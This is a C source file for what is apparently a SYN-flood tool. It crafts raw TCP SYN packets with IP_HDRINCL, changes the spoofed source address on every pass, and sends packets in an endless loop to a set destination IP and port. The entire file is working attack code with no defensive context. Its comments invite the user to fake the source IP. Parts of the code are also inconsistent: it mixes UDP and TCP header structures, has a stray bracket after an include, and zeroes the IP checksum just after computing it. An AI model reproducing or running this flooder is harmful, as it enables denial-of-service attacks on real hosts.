#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>]
#include <time.h>


#include "header.h"

#define SRC_IP  "129.104.97.83" //set your source ip here. It can be a fake one
#define SRC_PORT 54321 //set the source port here. It can be a fake one
#define DEST_IP "192.168.1.121" //set your destination ip here
#define DEST_PORT 8081  //set the destination port here
#define TEST_STRING "syn" //a test string as packet payload
#define PCKT_SIZE 8000

int data_size;
void fill_tcph(struct tcphdr* tcph){
    tcph->source=htons(SRC_PORT);
    tcph->dest=htons(DEST_PORT);
    tcph->seq=htonl(4242); //random
    tcph->ack_seq=htonl(4242); //also random
    tcph->doff=5;
    tcph->syn=1;
    tcph->window=htons(PCKT_SIZE);
    tcph->urg_ptr=htons(4242); //nothing urgent
        
}

void fill_iph(struct iphdr* iph){
	iph->version=4;
	iph->tos=0;
	iph->ihl=5;
	iph->tot_len=htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_size);
	iph->id=htons(1);    
	iph->frag_off= htons(0);
	iph->ttl=100;
	iph->protocol=IPPROTO_TCP;
	inet_pton(AF_INET,SRC_IP,&(iph->saddr));
	inet_pton(AF_INET,DEST_IP,&(iph->daddr));
	iph->check=htons(checksum((char*) iph,iph->tot_len));
	iph->check=0;
}

int main(){
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	srand(time(NULL));
	char* src_ip=malloc(100);
	strcpy(src_ip,SRC_IP);
    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	if(fd < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}

	char packet[PCKT_SIZE], *data;
	char data_string[] = TEST_STRING;
	memset(packet, 0, PCKT_SIZE);

	//IP header pointer
	struct iphdr *iph = (struct iphdr *)packet;

	//UDP header pointer
	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
	

	struct pseudo_udp_header psh; //pseudo header
	

	//data section pointer
	data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

	//fill the data section
	strncpy(data, data_string, strlen(data_string));
	data_size=strlen(data);
	fill_iph(iph);
	fill_tcph(tcph);

    //fill pseudo header
    psh.source_address=iph->saddr;
	psh.dest_address=iph->daddr;
	psh.placeholder=0;
	psh.protocol=iph->protocol;
	psh.udp_length=htons(tcph->doff);


    int psize = sizeof(struct pseudo_udp_header) + sizeof(struct udphdr) + strlen(data);
	void* pseudogram = malloc(psize);
	memset(pseudogram,0,psize);
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_udp_header));
	memcpy(pseudogram + sizeof(struct pseudo_udp_header) , tcph , sizeof(struct tcphdr) + strlen(data));
	tcph->check = checksum((unsigned short *) pseudogram,psize);
	free(pseudogram);
    struct sockaddr_in to;
	to.sin_addr.s_addr=iph->daddr;
	to.sin_family=AF_INET;
	to.sin_port=tcph->dest;
	char street [10];

    while(1){
	//randomize sender
	sprintf(street,"%d",rand()%100);
	strcpy(src_ip,"192.168.1.");
	strcat(src_ip,street);
	inet_pton(AF_INET,src_ip,&(iph->saddr));
	//iph->saddr=(short) rand();
	//printf("%s\n",src_ip);
	printf("%d\n",iph->saddr);
	//tcph->source=htons((short) (rand()%10000));
	iph->check=htons(checksum((char*) iph,iph->tot_len));
	void* pseudogram = malloc(psize);
	memset(pseudogram,0,psize);
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_udp_header));
	memcpy(pseudogram + sizeof(struct pseudo_udp_header) , tcph , sizeof(struct tcphdr) + strlen(data));
	tcph->check = checksum((unsigned short *) pseudogram,psize);
	free(pseudogram);
	

	sendto(fd,packet,ntohs(iph->tot_len),0,&to,sizeof(to));
	perror("");
	}
	return 0;

}